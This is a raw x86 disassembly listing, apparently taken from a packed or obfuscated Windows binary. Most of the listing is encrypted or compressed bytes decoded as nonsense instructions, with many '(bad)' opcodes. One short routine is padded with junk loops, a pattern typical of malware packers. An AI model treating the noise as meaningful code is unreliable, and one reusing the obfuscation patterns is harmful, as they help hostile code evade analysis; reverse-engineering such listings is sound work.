  4031b9:	add    DWORD PTR [esi],ebx
  4031bb:	and    DWORD PTR [edi],esp
  4031bd:	ja     0x40323d
  4031bf:	inc    edx
  4031c0:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031c2:	outs   dx,DWORD PTR ds:[esi]
  4031c3:	cmp    bl,BYTE PTR [esi+0x70]
  4031c6:	js     0x4031ba
  4031c8:	call   0xb8e1:0x470e336b
  4031cf:	sub    DWORD PTR [edx],0x800914b7
  4031d5:	add    al,0x2a
  4031d7:	cld    
  4031d8:	mov    ebx,DWORD PTR [eax]
  4031da:	stos   DWORD PTR es:[edi],eax
  4031db:	dec    edi
  4031dc:	mov    ds:0xe80e86c4,eax
  4031e1:	and    eax,0x85e6006e
  4031e6:	(bad)  
  4031e7:	sbb    eax,0x6e426db2
  4031ec:	pop    es
  4031ed:	xor    DWORD PTR [edi+0x66],ebx
  4031f0:	in     al,dx
  4031f1:	adc    eax,0xd2be7cb6
  4031f6:	repz loope 0x4031e4
  4031f9:	xchg   ebp,eax
  4031fa:	ja     0x4031d7
  4031fc:	arpl   WORD PTR [ecx],dx
  4031fe:	retf   
  4031ff:	cmp    eax,0xc094042a
  403204:	pusha  
  403205:	mov    WORD PTR [eax+0x59450e51],ds
  40320b:	imul   edx,DWORD PTR [ebp-0xa],0xffffff8c
  40320f:	add    DWORD PTR [ebp-0x6a],esp
  403212:	and    BYTE PTR [edi+0x256d6923],ch
  403218:	in     al,dx
  403219:	jno    0x403296
  40321b:	cmc    
  40321c:	retf   0xe080
  40321f:	jb     0x403274
  403221:	xor    ch,BYTE PTR [ebx+0x4483051f]
  403227:	out    dx,eax
  403228:	push   ebp
  403229:	es push cs
  40322b:	imul   eax,DWORD PTR ss:[ebx+eiz*1],0x737da7a2
  403233:	sbb    bl,bl
  403235:	int3   
  403236:	call   0xd72a:0x92de1e2c
  40323d:	retf   
  40323e:	cmp    al,0x78
  403240:	xchg   esi,eax
  403241:	mov    DWORD PTR [ebx+0x74],eax
  403244:	add    ah,ch
  403246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403247:	ror    DWORD PTR [edi],cl
  403249:	add    BYTE PTR [esi-0x71],dh
  40324c:	jp     0x40322a
  40324e:	leave  
  40324f:	pop    ss
  403250:	sbb    DWORD PTR ds:0x27c021b6,ebp
  403256:	leave  
  403257:	push   0xb6aebcc6
  40325c:	xor    al,0x4c
  40325e:	aaa    
  40325f:	cs daa 
  403261:	call   0x1cc3:0x921f9c86
  403268:	xchg   BYTE PTR [edi+0x2e],bh
  40326b:	jge    0x4032e8
  40326d:	adc    eax,0xb3cbdfa8
  403272:	add    cl,cl
  403274:	test   al,0x87
  403277:	lods   al,BYTE PTR ds:[esi]
  403278:	stos   DWORD PTR es:[edi],eax
  403279:	add    ah,ah
  40327b:	test   al,0xa9
  40327d:	pop    ebp
  40327e:	mov    ah,0xc0
  403280:	dec    esi
  403281:	inc    edx
  403282:	inc    eax
  403283:	mov    esi,0xafdea4dc
  403288:	arpl   WORD PTR [edx+0x5aa76ab1],sp
  40328e:	imul   ecx,eax,0x1b
  403291:	sub    ecx,DWORD PTR [eax+0x24]
  403294:	das    
  403295:	sub    DWORD PTR [ebx-0x7e8c4d16],edx
  40329b:	xchg   edi,eax
  40329c:	mov    DWORD PTR [ecx+ebp*4],ebp
  40329f:	(bad)  
  4032a0:	sbb    DWORD PTR [edi],esi
  4032a2:	xor    eax,0x5c7fb0b9
  4032a7:	sbb    BYTE PTR [edi-0x29],bh
  4032aa:	dec    ebp
  4032ab:	neg    DWORD PTR [ecx+0x24295856]
  4032b1:	push   edx
  4032b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032b4:	push   esp
  4032b5:	push   ecx
  4032b6:	sbb    BYTE PTR [esi],al
  4032b8:	xchg   esp,edi
  4032ba:	add    BYTE PTR [esi+ecx*8+0x7e],ch
  4032be:	jecxz  0x403252
  4032c0:	push   eax
  4032c1:	cwde   
  4032c2:	sbb    BYTE PTR [esi+0x77],al
  4032c5:	mov    ecx,ds
  4032c7:	mov    cl,0xc7
  4032c9:	jmp    0x403349
  4032cb:	jmp    0xa58ebc72
  4032d0:	repnz ss push ds
  4032d3:	cmp    al,0x78
  4032d5:	stos   BYTE PTR es:[edi],al
  4032d6:	inc    ebp
  4032d7:	mov    ebp,0x9935e600
  4032dc:	add    BYTE PTR [eax+0x36f4aeb4],cl
  4032e2:	sub    eax,0xa10bb6b
  4032e7:	sbb    ch,BYTE PTR [ebx+edx*1+0x404b6259]
  4032ee:	mov    ah,0x5f
  4032f0:	mov    eax,0x1498bca6
  4032f5:	push   esi
  4032f6:	test   al,0x42
  4032f8:	out    0x80,al
  4032fa:	xchg   ebp,eax
  4032fb:	jg     0x403372
  4032fd:	push   esi
  4032fe:	fist   DWORD PTR [ebx+eax*2+0x2668b9ca]
  403305:	jnp    0x40335a
  403307:	cmp    WORD PTR [ebx],bp
  40330a:	sti    
  40330b:	jge    0x4032f1
  40330d:	lods   al,BYTE PTR ds:[esi]
  40330e:	dec    eax
  40330f:	mov    al,0x13
  403311:	cli    
  403312:	mov    ebx,0xd2b8a794
  403317:	jmp    0x403392
  403319:	fcom   QWORD PTR [eax-0x76]
  40331c:	scas   eax,DWORD PTR es:[edi]
  40331d:	shl    BYTE PTR [edi],0x4b
  403320:	pop    edi
  403321:	xor    al,0x38
  403323:	dec    esp
  403324:	fld    DWORD PTR [edx]
  403326:	sbb    eax,0x14e6dd6a
  40332b:	(bad)  
  40332c:	neg    BYTE PTR [ecx+0x1d1238b0]
  403332:	pop    ebx
  403333:	fistp  WORD PTR [ebp+0x6f]
  403336:	shl    DWORD PTR [esi+0x24],0xc
  40333a:	out    0x56,eax
  40333c:	add    dl,BYTE PTR [ecx]
  40333e:	pop    ss
  40333f:	popf   
  403340:	int    0xf2
  403342:	fdivr  DWORD PTR [ecx]
  403344:	dec    esi
  403345:	bound  eax,QWORD PTR [eax+edi*8+0x6f7c7274]
  40334c:	std    
  40334d:	hlt    
  40334e:	fldcw  WORD PTR [edi-0x2b]
  403351:	bound  edi,QWORD PTR [esi-0x44]
  403354:	or     edx,DWORD PTR [ebp+0x3e9c56d6]
  40335a:	xchg   esp,eax
  40335b:	cmp    eax,0x34976d5f
  403360:	pop    ss
  403361:	mov    eax,0x2e068145
  403366:	sbb    cl,BYTE PTR [esi-0x7b4041af]
  40336c:	sbb    ecx,DWORD PTR [ebx-0x5c]
  40336f:	add    edx,edi
  403371:	aam    0x7a
  403373:	inc    ebp
  403374:	aaa    
  403375:	and    esp,DWORD PTR [esi]
  403377:	inc    esi
  403378:	pop    esp
  403379:	add    BYTE PTR [edx-0x3],bl
  40337c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40337d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40337e:	adc    DWORD PTR [eax-0x57],edi
  403381:	dec    esi
  403382:	inc    eax
  403383:	mov    ebp,0x2a38cc67
  403388:	jmp    0x40331c
  40338a:	cdq    
  40338b:	rcl    ecx,cl
  40338d:	jg     0x403332
  40338f:	sbb    BYTE PTR [ecx-0x17],al
  403392:	enter  0x4a9e,0x39
  403396:	rcl    DWORD PTR [esi-0x56],cl
  403399:	add    DWORD PTR [ebx+ecx*4-0x50f0f78b],eax
  4033a0:	cli    
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	dec    esi
  4033ba:	ret    
  4033bb:	popf   
  4033bc:	cmp    bh,BYTE PTR [edx]
  4033be:	adc    al,0x70
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x403372
  4033c6:	inc    esp
  4033c7:	push   cs
  4033c8:	cdq    
  4033c9:	ret    
  4033ca:	or     eax,0x6da7ae83
  4033cf:	push   esp
  4033d0:	inc    edx
  4033d1:	fldenv [edi-0x482c7e50]
  4033d7:	mov    edi,0xf671ca17
  4033dc:	js     0x403450
  4033de:	repz jns 0x40342e
  4033e1:	stc    
  4033e2:	jle    0x4033c9
  4033e4:	inc    esp
  4033e5:	imul   ecx,DWORD PTR [edx],0xffffff8e
  4033e8:	(bad)
  4033eb:	mov    bl,0x13
  4033ed:	jle    0x403435
  4033ef:	ret    
  4033f0:	push   ecx
  4033f1:	bound  ebp,QWORD PTR [eax]
  4033f3:	shl    BYTE PTR [ebx-0x19f9a37c],cl
  4033f9:	mov    bl,0xd3
  4033fb:	and    edi,ebp
  4033fd:	jp     0x4033ab
  4033ff:	adc    BYTE PTR [eax-0x56d19b0f],0x8e
  403406:	pusha  
  403407:	loop   0x40338c
  403409:	adc    BYTE PTR [eax],bl
  40340b:	push   ss
  40340c:	mov    bl,0x6d
  40340e:	sbb    eax,0xb3d2d7e6
  403413:	inc    ecx
  403414:	cwde   
  403415:	(bad)  
  403416:	fcmovb st,st(1)
  403418:	sahf   
  403419:	test   eax,0xfdbde39d
  40341e:	and    ecx,DWORD PTR [edx-0x3f]
  403421:	inc    ebp
  403422:	or     DWORD PTR [ebx-0x41],esi
  403425:	mov    ecx,0x4b0ff713
  40342a:	aam    0xd8
  40342c:	dec    esp
  40342d:	sbb    dl,BYTE PTR [esi-0x60180e15]
  403433:	cmp    esi,DWORD PTR [ecx+0x1]
  403436:	mul    DWORD PTR [edx+edi*4]
  403439:	inc    edx
  40343a:	test   eax,0xa69c9848
  40343f:	rcr    ebx,cl
  403441:	mov    ecx,0xecc98a0b
  403446:	ret    
  403447:	cmp    al,0x30
  403449:	xchg   ebp,eax
  40344a:	jl     0x4033ea
  40344c:	mov    dh,BYTE PTR [edx-0x47]
  40344f:	xchg   esp,eax
  403450:	test   eax,0xd09b6862
  403455:	cmp    eax,0xd26878e6
  40345a:	jecxz  0x40347e
  40345c:	clc    
  40345d:	scas   al,BYTE PTR es:[edi]
  40345e:	mov    al,0x83
  403460:	cwde   
  403461:	(bad)  
  403462:	aad    0xdc
  403464:	or     BYTE PTR [ecx+0x1f271c80],ah
  40346a:	cmp    DWORD PTR [ecx-0x36],eax
  40346d:	ja     0x403477
  40346f:	sbb    esi,DWORD PTR [edi+0x4bfb9e94]
  403475:	bound  esi,QWORD PTR [esi-0x7cfd0ad]
  40347b:	retf   
  40347c:	aam    0xeb
  40347e:	leave  
  40347f:	hlt    
  403480:	scas   al,BYTE PTR es:[edi]
  403481:	or     BYTE PTR [edi],0xf8
  403484:	nop    edi
  403487:	ret    0xe986
  40348a:	dec    ecx
  40348b:	outs   dx,BYTE PTR ds:[esi]
  40348c:	dec    edi
  40348d:	adc    al,0x4b
  40348f:	or     dl,BYTE PTR [edx+0x40]
  403492:	pop    ebp
  403493:	jns    0x4034d9
  403495:	jle    0x4034bf
  403497:	int    0xb4
  403499:	mov    ebp,0xd7766232
  40349e:	and    eax,0x5a879ee2
  4034a3:	xlat   BYTE PTR ds:[ebx]
  4034a4:	cmp    bl,BYTE PTR [ecx+0x42]
  4034a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034a8:	mov    cl,0x38
  4034aa:	popa   
  4034ab:	pop    eax
  4034ac:	push   ss
  4034ad:	xchg   ebp,eax
  4034ae:	jp     0x403486
  4034b0:	add    eax,ebx
  4034b2:	in     al,dx
  4034b3:	jmp    0x5171:0x2f553e33
  4034ba:	jmp    0x16b4a2ee
  4034bf:	add    edi,DWORD PTR [ebx-0x7e]
  4034c2:	or     esi,ebp
  4034c4:	leave  
  4034c5:	sub    bl,BYTE PTR [edi+ebx*2]
  4034c8:	xchg   edx,eax
  4034c9:	dec    ebp
  4034ca:	push   ebx
  4034cb:	mov    ch,0x7f
  4034cd:	adc    DWORD PTR cs:[esi],esi
  4034d0:	std    
  4034d1:	pop    esp
  4034d2:	sbb    ah,BYTE PTR [ecx-0x7f]
  4034d5:	or     BYTE PTR [eax+0x4],0x3b
  4034d9:	sub    edi,0x4c
  4034dc:	shr    esp,0x2e
  4034df:	into   
  4034e0:	mov    BYTE PTR ds:0xb193daa0,dh
  4034e6:	or     esp,DWORD PTR [ecx+0x1b372cc5]
  4034ec:	jle    0x403501
  4034ee:	pop    ss
  4034ef:	fnstsw WORD PTR [esi-0x76586055]
  4034f5:	fcomp  QWORD PTR [eax-0x2a8b1804]
  4034fb:	sbb    ah,0x7d
  4034fe:	enter  0x65d6,0xdf
  403502:	inc    eax
  403503:	into   
  403504:	leave  
  403505:	sbb    al,0x4f
  403507:	ret    0xb337
  40350a:	push   edi
  40350b:	test   al,0x6c
  40350d:	dec    esi
  40350e:	neg    ebp
  403510:	xor    DWORD PTR [ebx+ecx*4-0x64],edx
  403514:	imul   ecx,DWORD PTR [ebx+edx*2-0x42],0xffffff82
  403519:	out    0xfc,eax
  40351b:	pop    es
  40351c:	adc    al,0x91
  40351e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40351f:	or     DWORD PTR [ecx],0x9423cd24
  403525:	sbb    bl,BYTE PTR [esi+0x573e1b31]
  40352b:	lahf   
  40352c:	in     eax,dx
  40352d:	mov    esi,0xb2be55ad
  403532:	ror    DWORD PTR [eax],1
  403534:	out    0x3e,al
  403536:	rol    DWORD PTR [ebx-0x2c],1
  403539:	aad    0xb2
  40353b:	sub    bl,dh
  40353d:	xchg   esp,eax
  40353e:	idiv   dl
  403540:	xor    bh,dl
  403542:	push   esp
  403543:	xchg   esp,eax
  403544:	fidiv  DWORD PTR [ebx]
  403546:	dec    ebx
  403547:	cmp    ch,BYTE PTR [eax+edi*4+0x6f161105]
  40354e:	pop    eax
  40354f:	pop    ds
  403550:	jle    0x4034d3
  403552:	inc    edx
  403553:	mov    ebp,0xb69dd895
  403558:	push   ebp
  403559:	mov    ah,0xa8
  40355b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40355c:	(bad)  
  40355d:	cmp    DWORD PTR [ebx+0x23],eax
  403560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403561:	cs mov esp,0x835241b6
  403567:	add    DWORD PTR [ecx],eax
  403569:	xor    DWORD PTR [esi-0x62],eax
  40356c:	jp     0x4035d9
  40356e:	dec    esp
  40356f:	cld    
  403570:	je     0x4035bf
  403572:	add    eax,0xea5b4adb
  403577:	pop    ebx
  403578:	das    
  403579:	or     eax,0x37120c4e
  40357e:	mov    ds:0x86c8579e,al
  403583:	pop    edx
  403584:	inc    ebp
  403585:	and    ecx,DWORD PTR [esp+eiz*4-0x4c]
  403589:	repnz (bad) 
  40358b:	mov    dh,0x4e
  40358d:	(bad)  
  40358e:	dec    ebx
  40358f:	push   ds
  403590:	mov    ecx,0x9a71fc4f
  403595:	ficomp WORD PTR ds:0x51a6b484
  40359b:	ja     0x40352d
  40359d:	and    cl,BYTE PTR [ebp+0x64]
  4035a0:	nop
  4035a1:	test   BYTE PTR ds:0x6995d434,ch
  4035a7:	fwait
  4035a8:	jns    0x4035ac
  4035aa:	and    cl,bh
  4035ac:	mov    cl,0x7
  4035ae:	cmc    
  4035af:	call   0x92c86469
  4035b4:	stc    
  4035b5:	(bad)  [eax]
  4035b7:	dec    BYTE PTR [edi-0x73737c49]
  4035bd:	xchg   esi,eax
  4035be:	adc    ah,BYTE PTR [eax-0x7e3e8c6c]
  4035c4:	sbb    bh,BYTE PTR [eax-0x2d]
  4035c7:	loop   0x403646
  4035c9:	inc    edx
  4035ca:	outs   dx,DWORD PTR ds:[esi]
  4035cb:	jg     0x4035a3
  4035cd:	jmp    0x40359f
  4035cf:	pop    ss
  4035d0:	mov    ?,WORD PTR [esp+ecx*4+0x3823bdd3]
  4035d7:	dec    edi
  4035d8:	mov    esp,0x4275bb9c
  4035dd:	dec    eax
  4035de:	xchg   ebx,eax
  4035df:	sub    BYTE PTR [edx-0x3a],bh
  4035e2:	push   edx
  4035e3:	jb     0x403584
  4035e5:	mov    ah,0xc9
  4035e7:	push   esi
  4035e8:	popf   
  4035e9:	mov    WORD PTR [bp+di-0x1c],es
  4035ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035ee:	out    0x72,eax
  4035f0:	xchg   DWORD PTR [ebx],ebp
  4035f2:	jne    0x403622
  4035f4:	div    dh
  4035f6:	mov    edi,ecx
  4035f8:	enter  0x6f45,0xc3
  4035fc:	in     eax,dx
  4035fd:	mov    ?,WORD PTR [ecx-0x58]
  403600:	retf   
  403601:	dec    ebx
  403602:	sbb    bh,0x19
  403605:	sbb    al,0xaf
  403607:	aaa    
  403608:	mov    dh,0x1b
  40360a:	out    dx,al
  40360b:	out    0xbe,eax
  40360d:	push   es
  40360e:	xchg   DWORD PTR [edx+0x2332c623],edi
  403614:	shl    dl,1
  403616:	jmp    0xe6c9:0xe667efcd
  40361d:	mov    ch,0x1f
  40361f:	xchg   dl,dl
  403621:	add    dh,BYTE PTR [ebp-0x5f540004]
  403627:	mov    al,BYTE PTR [edi+0x13]
  40362a:	mov    ds:0xa6973924,al
  40362f:	push   ds
  403630:	add    eax,0xe0adff15
  403635:	sti    
  403636:	sub    BYTE PTR [ecx-0x2ccac8fb],dh
  40363c:	popa   
  40363d:	das    
  40363e:	lods   eax,DWORD PTR gs:[esi]
  403640:	mov    BYTE PTR [eax+0x1d240fd2],dl
  403646:	sub    eax,DWORD PTR [ebx-0x4438bb9e]
  40364c:	and    ah,0x2c
  40364f:	dec    edi
  403650:	inc    ebp
  403651:	mov    ebp,0x22d5e075
  403656:	scas   al,BYTE PTR es:[edi]
  403657:	sbb    al,0x5b
  403659:	inc    ebx
  40365a:	mov    gs,WORD PTR [ecx+0x17cf01b8]
  403660:	ins    BYTE PTR es:[edi],dx
  403661:	pusha  
  403662:	cmp    BYTE PTR [ebx],bl
  403664:	add    ebx,DWORD PTR [eax+0x70]
  403667:	pop    ss
  403668:	in     al,0xce
  40366a:	adc    BYTE PTR [edx],bl
  40366c:	hlt    
  40366d:	push   ecx
  40366e:	outs   dx,DWORD PTR ds:[esi]
  40366f:	rcr    DWORD PTR [edi-0x405e95c4],cl
  403675:	xchg   esp,eax
  403676:	mov    al,ds:0x92324b07
  40367b:	and    BYTE PTR [edi],ch
  40367d:	call   0x557c768
  403682:	sub    ch,bh
  403684:	retf   
  403685:	sahf   
  403686:	jno    0x403612
  403688:	test   BYTE PTR [ebx],al
  40368a:	pushf  
  40368b:	jb     0x4036bf
  40368d:	add    BYTE PTR [eax+0x458b3704],cl
  403693:	cld    
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fced,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fced,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fced,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e2d7
  4036fc:	cmp    DWORD PTR ds:0x42fced,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fced
  403711:	dec    eax
  403712:	mov    ds:0x42fced,eax
  403717:	mov    eax,ds:0x42fced
  40371c:	dec    eax
  40371d:	mov    ds:0x42fced,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e6f3,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e6f7,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd0d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e713,0x42e11c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fd7a,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e124,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e70f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    DWORD PTR [ecx],esp
  4037a2:	pop    ds
  4037a3:	jl     0x4037b2
  4037a5:	js     0x4037b8
  4037a7:	jo     0x403819
  4037a9:	cmp    eax,0xdb70707d
  4037ae:	clc    
  4037af:	jae    0x403797
  4037b1:	mov    dl,0x19
  4037b3:	push   cs
  4037b4:	fst    QWORD PTR [ecx-0x192dc655]
  4037ba:	scas   al,BYTE PTR es:[edi]
  4037bb:	call   0xf865:0xf0a3ed31
  4037c2:	jo     0x403819
  4037c4:	fisttp WORD PTR [ecx]
  4037c6:	push   esi
  4037c7:	jns    0x4037d7
  4037c9:	mov    fs,WORD PTR ds:0x2aa930e
  4037cf:	neg    BYTE PTR [edi+0x587f711b]
  4037d5:	fs jns 0x403842
  4037d8:	(bad)  
  4037d9:	retf   0xeb10
  4037dc:	add    eax,0xd3d11505
  4037e1:	int3   
  4037e2:	jns    0x40385d
  4037e4:	sub    edi,DWORD PTR [edi+0x59b40015]
  4037ea:	inc    esp
  4037eb:	cmp    ch,dl
  4037ed:	mov    ah,0x11
  4037ef:	ins    DWORD PTR es:[edi],dx
  4037f0:	inc    eax
  4037f1:	div    DWORD PTR [eax+0x9]
  4037f4:	dec    ebp
  4037f5:	adc    bh,BYTE PTR [ebp+0x8]
  4037f8:	mov    ch,BYTE PTR [ebp+0x20ed6427]
  4037fe:	pop    edx
  4037ff:	or     edi,ebx
  403801:	in     eax,0xc3
  403803:	adc    BYTE PTR [ebx+0x64],dl
  403806:	mov    edx,0x380bd1bf
  40380b:	mov    eax,0x3a13dd30
  403810:	add    al,0x3b
  403812:	xchg   edx,eax
  403813:	push   edx
  403814:	push   edi
  403815:	(bad)  
  403817:	mov    ah,ch
  403819:	xor    eax,0xc1952f14
  40381e:	retf   0x2a49
  403821:	cmp    BYTE PTR [edi+ecx*4+0x60],dl
  403825:	and    BYTE PTR [ebp-0xeb8e88c],0xba
  40382c:	out    0x6d,eax
  40382e:	pop    ebx
  40382f:	mov    esi,0xb6ba3756
  403834:	addr16 call 0x1ca9:0x525cd239
  40383c:	shr    edx,1
  40383e:	add    ebx,DWORD PTR [ecx+0x24]
  403841:	je     0x403838
  403843:	push   esi
  403844:	adc    bh,bl
  403846:	pop    es
  403847:	xor    DWORD PTR [esi],ecx
  403849:	pop    esp
  40384a:	adc    al,0xc3
  40384c:	leave  
  40384d:	inc    edx
  40384e:	pop    ebx
  40384f:	mov    dl,0x54
  403851:	sbb    al,0x4e
  403853:	add    al,BYTE PTR [ebx+0x8bfedfb]
  403859:	es inc esi
  40385b:	xor    al,0xca
  40385d:	add    dh,dl
  40385f:	mov    dl,0xc1
  403861:	adc    al,0x1e
  403863:	sbb    DWORD PTR [ecx-0x645d6339],ecx
  403869:	int    0x6a
  40386b:	xchg   edi,eax
  40386c:	loopne 0x403849
  40386e:	mov    edx,DWORD PTR [ecx]
  403870:	call   FWORD PTR [ebx]
  403872:	pop    eax
  403873:	or     eax,0x23d9d944
  403878:	(bad)  
  40387a:	jns    0x4038a2
  40387c:	stos   BYTE PTR es:[edi],al
  40387d:	pusha  
  40387e:	dec    ecx
  40387f:	addr16 int 0x26
  403882:	mov    ch,0xae
  403884:	add    DWORD PTR [ebp-0x7a],ebp
  403887:	sbb    ch,BYTE PTR [eax+0x1f]
  40388a:	imul   esi,DWORD PTR [esi],0x54e73ffd
  403890:	retf   
  403891:	pop    esp
  403892:	shr    DWORD PTR [ecx],cl
  403894:	out    0x30,eax
  403896:	push   eax
  403897:	jecxz  0x4038d6
  403899:	cmp    ebx,DWORD PTR [ecx+0x63]
  40389c:	inc    edi
  40389d:	ret    
  40389e:	sar    BYTE PTR [ecx+0x5b],cl
  4038a1:	mov    dh,BYTE PTR [edi+0x1]
  4038a4:	std    
  4038a5:	rcr    BYTE PTR [edi+0x2ceb4088],cl
  4038ab:	in     eax,dx
  4038ac:	iret   
  4038ad:	enter  0x4d73,0xc8
  4038b1:	cli    
  4038b2:	aad    0xdd
  4038b4:	imul   eax,DWORD PTR [edx+esi*4+0x22],0xbd19e264
  4038bc:	pop    es
  4038bd:	jnp    0x4038d6
  4038bf:	push   cs
  4038c0:	ss mov dh,0x70
  4038c3:	pop    ecx
  4038c4:	cmp    DWORD PTR [esi+0x1296f58b],eax
  4038ca:	jbe    0x40393d
  4038cc:	leave  
  4038cd:	das    
  4038ce:	sar    DWORD PTR [edi+esi*4],0xd9
  4038d2:	or     BYTE PTR [edi],ah
  4038d4:	mov    esp,0x5f61e22b
  4038d9:	sub    eax,0xe1c855ee
  4038de:	cdq    
  4038df:	inc    edx
  4038e0:	imul   eax,DWORD PTR [ebx-0x47],0x3d
  4038e4:	jnp    0x40389f
  4038e6:	xchg   esp,eax
  4038e7:	rol    ebx,0x5c
  4038ea:	test   eax,0x378c47aa
  4038ef:	not    ah
  4038f1:	mov    cs,WORD PTR [ecx-0x3f9f8900]
  4038f7:	cmp    al,0x12
  4038f9:	aas    
  4038fa:	inc    edi
  4038fb:	test   DWORD PTR [ebp+0x70],edx
  4038fe:	inc    eax
  4038ff:	inc    esp
  403900:	mov    cl,0xe8
  403902:	aas    
  403903:	dec    esp
  403904:	mov    WORD PTR [ecx+0x1c11efde],cs
  40390a:	add    edi,DWORD PTR [esi-0x1ce78465]
  403910:	test   BYTE PTR [edx],al
  403912:	pop    esp
  403913:	cdq    
  403914:	and    DWORD PTR [esp+eiz*2+0x1f941f07],eax
  40391b:	rcl    BYTE PTR [edi],0xb0
  40391e:	xor    DWORD PTR [esp+ebp*4+0x5d],ebp
  403922:	iret   
  403923:	jns    0x403983
  403925:	mov    ebx,0xab9e1b24
  40392a:	ret    0x7a4b
  40392d:	outs   dx,BYTE PTR ds:[esi]
  40392e:	(bad)  
  40392f:	cmp    eax,0x9b483b65
  403934:	add    DWORD PTR [edi],ebx
  403936:	jae    0x4038bc
  403938:	cmp    al,0x44
  40393a:	mov    al,ds:0x40fbdea3
  40393f:	fidiv  WORD PTR [eax+0x442512fd]
  403945:	pop    ecx
  403946:	pop    esi
  403947:	adc    ah,BYTE PTR [eax-0x7a]
  40394a:	push   ss
  40394b:	add    al,0xa7
  40394d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40394e:	fistp  QWORD PTR [edi+0x49641273]
  403954:	adc    edx,ecx
  403956:	loope  0x4038f0
  403958:	(bad)
  40395c:	out    0x79,eax
  40395e:	out    0x74,al
  403960:	mov    esi,0x6d116d53
  403965:	jmp    0xe5d3:0x8fd21182
  40396c:	popa   
  40396d:	out    dx,eax
  40396e:	out    dx,al
  40396f:	aas    
  403970:	nop
  403971:	xchg   esp,eax
  403972:	sub    eax,0x5691787f
  403977:	(bad)
  40397a:	int    0xe5
  40397c:	mov    bh,0xe
  40397e:	or     ch,BYTE PTR [ecx]
  403980:	xchg   ebp,eax
  403981:	(bad)
  403985:	push   0xe8195f14
  40398a:	sbb    esi,DWORD PTR [edi]
  40398c:	add    DWORD PTR [esi],ecx
  40398e:	inc    esi
  40398f:	push   cs
  403990:	shl    DWORD PTR [esi+0x70971ce8],cl
  403996:	test   eax,0x7663e817
  40399b:	cmp    edi,esi
  40399d:	sbb    dh,dl
  40399f:	cwde   
  4039a0:	push   edi
  4039a1:	sbb    cl,BYTE PTR [ebx-0x30]
  4039a4:	call   0x9c0d:0xd5a27346
  4039ab:	aaa    
  4039ac:	cmp    DWORD PTR [ecx],ebx
  4039ae:	aas    
  4039af:	or     ch,BYTE PTR [edx-0x4]
  4039b2:	mov    cl,0xc4
  4039b4:	fs dec edi
  4039b6:	icebp  
  4039b7:	repz test eax,0xe7702a1a
  4039bd:	out    0xfa,al
  4039bf:	add    bl,BYTE PTR [edx]
  4039c1:	adc    BYTE PTR [edx+0x3d],cl
  4039c4:	repz dec eax
  4039c6:	sub    ebp,DWORD PTR [edx]
  4039c8:	int3   
  4039c9:	push   esi
  4039ca:	jle    0x403957
  4039cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039cd:	mov    bl,BYTE PTR [ebp+ebx*1-0x45f563d7]
  4039d4:	mov    DWORD PTR [edx-0x10],ebp
  4039d7:	fsubr  QWORD PTR [edx+0x2e]
  4039da:	jbe    0x403a1d
  4039dc:	mov    eax,ds:0x531b4dd3
  4039e1:	cdq    
  4039e2:	pop    esi
  4039e3:	js     0x4039ff
  4039e5:	inc    esp
  4039e6:	inc    esi
  4039e7:	xchg   edx,eax
  4039e8:	leave  
